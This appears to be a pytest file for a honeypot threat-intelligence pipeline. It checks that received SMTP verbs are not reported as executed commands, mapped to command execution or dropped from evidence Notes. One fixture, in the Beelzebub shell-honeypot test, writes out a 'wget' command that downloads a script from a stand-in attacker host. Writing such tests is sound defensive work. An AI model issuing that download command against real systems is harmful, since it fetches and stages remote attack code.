"""An SMTP verb the listener RECEIVED is not a command anyone RAN.

The ConPot defect, second instance. Mailoney appended received SMTP verbs to
`session.commands`; every consumer of that field believed the name. The ES
doc field really is called `commands`, because that is SMTP's word for a
verb — it is not this codebase's word for executed code.
"""
from __future__ import annotations

from collections import Counter

from tpot2cti.attack_mapping import techniques_for_session
from tpot2cti.parsers.mailoney import MailoneyParser
from tpot2cti.stix.builder import _signal_score


def _doc(verb, i, session_id="smtp-1"):
    return {
        "t-pot_hostname": "sensor01", "src_ip": "203.0.113.16",
        "dest_port": 25, "@timestamp": f"2026-03-07T13:16:{50 + i}.000000Z",
        "commands": verb, "session_id": session_id, "id": f"m{i}",
        "type": "Mailoney",
    }


def _session(verbs=("EHLO", "MAIL FROM", "RCPT TO", "DATA")):
    p = MailoneyParser()
    events = [e for e in (p.parse(_doc(v, i)) for i, v in enumerate(verbs)) if e]
    assert events, "the Mailoney fixture stopped parsing — fix the fixture"
    return p.correlate(events)[0]


def test_smtp_verbs_are_not_recorded_as_executed_commands():
    s = _session()
    assert s.protocol_requests == ["EHLO", "MAIL", "RCPT", "DATA"], \
        "the verbs were lost entirely"
    assert s.commands == [], (
        "SMTP verbs the listener RECEIVED are being reported as commands "
        "someone RAN — score, prose, ATT&CK and the Process builder all "
        "read that field"
    )


def test_a_relay_probe_no_longer_scores_as_shell_activity():
    """Measured before the fix: 75. Scores ratchet UP across cycles — the
    publisher's cross-cycle merge keeps max(score) — so an inflated score
    can never be walked back once published."""
    assert _signal_score(_session()) == 50


def test_smtp_verbs_do_not_map_to_command_execution():
    """T1059 is "Command and Scripting Interpreter". Nothing was
    interpreted; an SMTP listener received four verbs."""
    techniques = techniques_for_session(_session())
    assert not any("T1059" in str(t) for t in techniques), \
        f"received SMTP verbs still map to command execution: {techniques}"


def test_no_process_sdo_claims_the_verbs_were_executed(builder):
    """The worst artifact: a Process SDO whose command_line read
    'EHLO\\nMAIL\\nRCPT\\nDATA'."""
    objs = builder.build_mailoney_session(_session())
    kinds = Counter(o["type"] for o in objs)
    assert "process" not in kinds, "still asserting a process was executed"


def test_the_verbs_survive_as_evidence(builder):
    """Fixing the false claim must not lose the data."""
    objs = builder.build_mailoney_session(_session())
    notes = [o for o in objs if o["type"] == "note"]
    assert notes, "the SMTP verbs were dropped instead of preserved"
    body = notes[0]["content"]
    for verb in ("EHLO", "MAIL", "RCPT", "DATA"):
        assert verb in body, f"{verb} missing from the evidence Note"
    assert "nothing was executed" in body


def test_the_smtp_attack_pattern_is_still_emitted(builder):
    """The positive control. Demoting the false claim must not demote the
    true one — this is still SMTP abuse, and `interacted` holds via event
    meta and captured credentials rather than via `commands`."""
    objs = builder.build_mailoney_session(_session())
    aps = [o for o in objs if o["type"] == "attack-pattern"]
    assert aps, "the SMTP abuse / relay probe AttackPattern was lost"
    assert [o for o in objs if o["type"] == "indicator"], "the Indicator was lost"
    assert [o for o in objs if o["type"] == "sighting"], "the Sighting was lost"


def test_captured_credentials_are_untouched():
    """Credentials are a genuine substance signal and must not be affected
    by moving the verbs."""
    p = MailoneyParser()
    docs = [_doc("AUTH LOGIN", 0)]
    docs[0]["auth_user"], docs[0]["auth_pass"] = "root", "hunter2"
    events = [e for e in (p.parse(d) for d in docs) if e]
    s = p.correlate(events)[0]
    assert s.credentials_tried == [("root", "hunter2")]
    assert s.commands == []


def test_genuine_shell_honeypots_sharing_this_builder_are_untouched():
    """Beelzebub routes through the same `_build_protocol_session` but is an
    LLM *shell* honeypot — its commands really are executed, so they must
    stay in `commands` and keep their substance score. Without this, the
    assertions above would be satisfied by breaking command capture
    globally."""
    from tpot2cti.parsers.beelzebub import BeelzebubParser
    p = BeelzebubParser()
    doc = {
        "t-pot_hostname": "sensor01", "src_ip": "203.0.113.16",
        "dest_port": 22, "@timestamp": "2026-03-07T13:16:50.000000Z",
        "input": "wget http://evil.example/x.sh", "output": "saved x.sh",
        # `session` (not `session_id`) is REQUIRED here: correlate_by_session_id builds
        # singletons with AttackSession.from_event() and never runs the
        # aggregator, so an event without one silently loses its commands.
        "session": "bz-1", "id": "b1", "type": "Beelzebub",
    }
    ev = p.parse(doc)
    assert ev is not None, "the Beelzebub fixture stopped parsing"
    s = p.correlate([ev])[0]
    assert s.commands, "real shell-command capture regressed"
    assert not s.protocol_requests, "a shell command leaked into protocol_requests"
    assert _signal_score(s) > 50, "genuine commands no longer score as substance"


# ── the Note must never drop evidence silently ───────────────────────────

def test_a_long_verb_session_is_not_silently_truncated_to_five(builder):
    """The first cut fenced each element separately and hard-capped at 5 —
    sized for ConPot's multi-KB blobs, wrong for four-character SMTP verbs.
    A ten-verb session rendered EHLO/MAIL/RCPT/RCPT/RCPT and dropped DATA,
    VRFY and RSET while the abstract advertised ten. The parser refuses to
    dedup because a repeated RCPT TO is itself a signal, so repeated verbs
    are exactly what exhausted the budget."""
    verbs = ["EHLO", "MAIL FROM", "RCPT TO", "RCPT TO", "RCPT TO",
             "RCPT TO", "DATA", "RSET", "VRFY", "QUIT"]
    s = _session(verbs)
    assert len(s.protocol_requests) == 10

    objs = builder.build_mailoney_session(s)
    body = [o for o in objs if o["type"] == "note"][0]["content"]
    for verb in ("EHLO", "MAIL", "RCPT", "DATA", "RSET", "VRFY", "QUIT"):
        assert verb in body, f"{verb} was silently dropped from the Note"


def test_one_fence_not_one_fence_per_verb(builder):
    """Four verbs used to produce four fenced blocks — ~20 lines of chrome
    around 16 characters of content."""
    objs = builder.build_mailoney_session(_session())
    body = [o for o in objs if o["type"] == "note"][0]["content"]
    assert body.count("```") == 2, (
        f"expected a single fenced block, got {body.count('```') // 2}"
    )


def test_anything_omitted_is_announced():
    """A cap is fine. A silent cap is the defect class this change set is
    about."""
    from tpot2cti.stix.builder import (
        _MAX_PROTOCOL_REQUESTS_RENDERED, _render_protocol_requests,
    )
    many = [f"VRFY user{i}" for i in range(_MAX_PROTOCOL_REQUESTS_RENDERED + 25)]
    out = _render_protocol_requests(many)
    assert "additional request(s) omitted" in out, "the cap is silent"
    assert "25 additional" in out, f"wrong omitted count in: {out[-120:]}"


def test_the_byte_budget_is_announced_too():
    """A few huge elements must not blow the bundle, and must not vanish
    quietly either."""
    from tpot2cti.stix.builder import (
        _MAX_PROTOCOL_REQUEST_BYTES, _render_protocol_requests,
    )
    huge = ["A" * 3000, "B" * 3000, "C" * 3000, "D" * 3000]
    out = _render_protocol_requests(huge)
    assert len(out.encode("utf-8")) < _MAX_PROTOCOL_REQUEST_BYTES + 2000
    assert "truncated for size" in out
    assert "additional request(s) omitted" in out


def test_conpot_multiline_blobs_still_render(builder):
    """The shared renderer must keep working for what it was built for."""
    from tpot2cti.stix.builder import _render_protocol_requests
    blob = "GET /ecc/ HTTP/1.1\r\nHost: 10.0.0.1\r\nUser-Agent: curl\r\n"
    out = _render_protocol_requests([blob])
    assert "GET /ecc/" in out and "Host: 10.0.0.1" in out
    assert out.count("```") == 2
    assert "omitted" not in out, "nothing was omitted, so nothing should be claimed"
